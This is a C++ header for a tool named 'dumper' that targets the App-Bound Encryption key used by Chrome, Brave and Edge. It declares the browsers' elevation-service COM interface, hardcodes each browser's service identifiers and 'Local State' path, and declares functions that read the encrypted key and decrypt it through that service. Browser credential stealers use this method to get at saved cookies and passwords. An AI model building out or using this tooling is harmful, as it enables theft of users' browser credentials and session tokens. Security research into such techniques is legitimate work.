#pragma once

#include <windows.h>
#include <wrl/client.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <vector>
#include <string>

using std::vector;
using std::string;
using std::wstring;
using std::ifstream;

typedef enum ProtectionLevel
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
} ProtectionLevel;

typedef struct BrowserElevatorConfig {
    CLSID clsid;
    IID iid;
    std::wstring localState;
} BrowserElevatorConfig;

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        /* [string][in] */ const WCHAR * crx_path,
        /* [string][in] */ const WCHAR * browser_appid,
        /* [string][in] */ const WCHAR * browser_version,
        /* [string][in] */ const WCHAR * session_id,
        /* [in] */ DWORD caller_proc_id,
        /* [out] */ ULONG_PTR * proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        /* [in] */ ProtectionLevel protection_level,
        /* [in] */ const BSTR plaintext,
        /* [out] */ BSTR* ciphertext,
        /* [out] */ DWORD* last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        /* [in] */ const BSTR ciphertext,
        /* [out] */ BSTR* plaintext,
        /* [out] */ DWORD* last_error) = 0;
};


namespace dumper {

	namespace com {
		bool init();
		bool createElevator(Microsoft::WRL::ComPtr<IElevator>& elevator, BrowserElevatorConfig& config);
		bool setProxyBlanket(Microsoft::WRL::ComPtr<IElevator>& elevator);
	}

    namespace base64 {
        vector<uint8_t> decode(string& encodedStr);
    }

    namespace consts {
        constexpr size_t keySize = 32;
        const uint8_t keyPrefix[] = { 'A', 'P', 'P', 'B' };
        static const string BASE64_CHARS =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";
    }

    namespace key {
        vector<uint8_t> retrieveEncryptedKey(wstring& localStatePath);
        PBYTE decryptKey(Microsoft::WRL::ComPtr<IElevator> elevator, vector<uint8_t>& encryptedKey);
    }

    namespace configs {
        static BrowserElevatorConfig chrome = BrowserElevatorConfig
        {
            { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} },
            { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} },
            L"\\Google\\Chrome\\User Data\\Local State"
        
        };

        static BrowserElevatorConfig brave = BrowserElevatorConfig
        { 
            { 0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B} },
            { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} },
            L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
        };

        static BrowserElevatorConfig edge = BrowserElevatorConfig
        {
            { 0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B} },
            { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} },
            L"\\Microsoft\\Edge\\User Data\\Local State"
        };
    }

    PBYTE getAppBoundKey(BrowserElevatorConfig& config, wstring& localStatePath);
}